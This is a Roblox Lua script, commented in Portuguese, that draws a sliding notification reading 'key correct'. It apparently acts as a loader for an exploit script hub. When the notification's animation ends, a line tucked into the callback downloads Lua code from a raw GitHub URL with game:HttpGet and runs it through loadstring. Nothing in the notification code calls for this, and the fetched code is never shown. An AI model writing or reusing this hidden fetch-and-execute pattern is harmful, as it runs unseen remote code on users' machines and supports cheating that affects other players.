-- Criação do ScreenGui
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "NotificationGUI"
screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

-- Função para criar uma notificação
local function createNotification(iconId, message)
    -- Criação do Frame da notificação
    local notificationFrame = Instance.new("Frame")
    notificationFrame.Name = "NotificationFrame"
    notificationFrame.Size = UDim2.new(0, 300, 0, 100)
    notificationFrame.Position = UDim2.new(1, -310, 0.1, 0) -- Começa fora da tela à direita
    notificationFrame.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
    notificationFrame.BorderSizePixel = 0
    notificationFrame.Parent = screenGui
    
    -- Adiciona bordas arredondadas ao frame
    local uiCorner = Instance.new("UICorner")
    uiCorner.CornerRadius = UDim.new(0, 10)
    uiCorner.Parent = notificationFrame

    -- Criação do ícone
    local icon = Instance.new("ImageLabel")
    icon.Name = "Icon"
    icon.Size = UDim2.new(0, 50, 0, 50)
    icon.Position = UDim2.new(0, 10, 0.5, -25)
    icon.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    icon.BorderSizePixel = 0
    icon.Image = iconId
    icon.Parent = notificationFrame

    -- Criação do texto
    local textLabel = Instance.new("TextLabel")
    textLabel.Name = "TextLabel"
    textLabel.Size = UDim2.new(1, -70, 1, 0)
    textLabel.Position = UDim2.new(0, 70, 0, 0)
    textLabel.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
    textLabel.BorderSizePixel = 0
    textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    textLabel.Text = message
    textLabel.TextScaled = true
    textLabel.Font = Enum.Font.Gotham
    textLabel.TextSize = 20
    textLabel.Parent = notificationFrame

    -- Animação da notificação
    local tweenService = game:GetService("TweenService")
    local goal = {Position = UDim2.new(1, 0, 0.1, 0)} -- Mover para fora da tela
    
    local tweenInfo = TweenInfo.new(10, Enum.EasingStyle.Linear, Enum.EasingDirection.In)
    local tween = tweenService:Create(notificationFrame, tweenInfo, goal)

    -- Começa a animação após a criação
    tween:Play()

    -- Destroi a notificação após o fim da animação
    tween.Completed:Connect(function()
        notificationFrame:Destroy()
            loadstring(game:HttpGet(('https://raw.githubusercontent.com/Daviboycool/Scripthub/main/.github/Scriptcoolbyfadavid/Keynolol.lua')))()
    end)
end

-- Exemplo de uso
createNotification("rbxassetid://5578470925", "key correct ")


